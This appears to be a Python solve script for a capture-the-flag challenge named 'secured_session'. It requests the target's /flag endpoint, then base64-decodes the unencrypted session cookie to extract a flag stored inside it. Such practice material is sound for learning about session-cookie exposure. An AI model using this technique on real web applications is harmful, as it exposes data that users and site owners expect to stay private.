# Script to get flag for secured_session challenge
#
# Run as follows:
#
# poetry run python main.py <url>

import ast
import argparse
import base64

import requests


DEFAULT_FLAG = "flag not found"


def parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Script to get flag for secured_session challenge ",
    )
    parser.add_argument("url", metavar="url")

    args = parser.parse_args()
    return args


def get_session_cookie(url: str) -> str:
    response = requests.get(url + "flag", params={"secret_key": "123"})

    response.raise_for_status()

    session_cookie = response.cookies.get("session")

    return session_cookie


def get_decoded_cookie_value(cookie_value: str) -> str:
    cookie_value_decoded = ""

    for ex in ["", "=", "=="]:
        try:
            cookie_value_decoded = base64.b64decode(
                (cookie_value + ex).encode("utf-8")
            ).decode("utf-8")
        except Exception:
            continue
    if not cookie_value_decoded:
        print("Could not decode cookie, exiting")

    return cookie_value_decoded


def get_flag_from_decoded_cookie(cookie_value_decoded: str) -> str:
    cookie_dict = ast.literal_eval(cookie_value_decoded)
    if "flag" not in cookie_dict:
        return DEFAULT_FLAG
    return base64.b64decode(cookie_dict["flag"][" b"]).decode("utf-8")


def main(url: str) -> str:
    session_cookie = get_session_cookie(url)
    print(f"Got {session_cookie=}")

    cookie_value = session_cookie.split(".")[0]

    cookie_value_decoded = get_decoded_cookie_value(cookie_value)

    if not cookie_value_decoded:
        print("Could not decode cookie, exiting")

    return get_flag_from_decoded_cookie(cookie_value_decoded)


if __name__ == "__main__":
    args = parser()
    flag = main(args.url)
    print(f"flag: {flag}")
